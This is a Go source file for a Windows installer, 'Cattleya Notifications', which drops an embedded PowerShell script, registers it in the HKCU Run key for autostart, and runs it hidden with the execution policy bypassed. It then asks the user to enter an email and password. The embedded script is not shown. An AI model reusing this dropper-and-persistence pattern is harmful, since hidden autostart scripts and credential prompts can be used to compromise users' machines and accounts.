package main

import (
 "embed"
 "fmt"
 "os"
 "os/exec"
 "path/filepath"
 "syscall"
 "unsafe"
)

//go:embed agent.ps1
var agent embed.FS

var (
 user32 = syscall.NewLazyDLL("user32.dll")
 messageBox = user32.NewProc("MessageBoxW")
)
func alert(title, body string, flags uintptr) uintptr {
 t,_:=syscall.UTF16PtrFromString(title);b,_:=syscall.UTF16PtrFromString(body)
 r,_,_:=messageBox.Call(0,uintptr(unsafe.Pointer(b)),uintptr(unsafe.Pointer(t)),flags)
 return r
}
func main() {
 base,err:=os.UserConfigDir()
 if err!=nil {alert("Cattleya - Σφάλμα",err.Error(),0x10);return}
 dir:=filepath.Join(base,"CattleyaNotifications")
 if err=os.MkdirAll(dir,0700);err!=nil {alert("Cattleya",err.Error(),0x10);return}
 bytes,err:=agent.ReadFile("agent.ps1")
 if err!=nil {alert("Cattleya",err.Error(),0x10);return}
 script:=filepath.Join(dir,"CattleyaNotifications.ps1")
 if err=os.WriteFile(script,bytes,0600);err!=nil {alert("Cattleya",err.Error(),0x10);return}
 ps:=filepath.Join(os.Getenv("WINDIR"),"System32","WindowsPowerShell","v1.0","powershell.exe")
 args:=[]string{"-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",script}
 startup:=fmt.Sprintf("\"%s\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"",ps,script)
 cmd:=exec.Command("reg.exe","add",`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,"/v","CattleyaNotifications","/t","REG_SZ","/d",startup,"/f")
 if out,e:=cmd.CombinedOutput();e!=nil {alert("Cattleya - Εγκατάσταση",fmt.Sprintf("Η εφαρμογή γράφτηκε, αλλά δεν ενεργοποιήθηκε η αυτόματη εκκίνηση: %v\n%s",e,string(out)),0x30)}
 process:=exec.Command(ps,args...)
 if err=process.Start();err!=nil {alert("Cattleya - Σφάλμα",err.Error(),0x10);return}
 alert("Cattleya Notifications","Η εγκατάσταση ολοκληρώθηκε. Άνοιξε το παράθυρο σύνδεσης Cattleya Notifications και πληκτρολόγησε το email και τον κωδικό σου. Μπορείς έπειτα να κάνεις δοκιμή από το διαχειριστικό.",0x40)
}
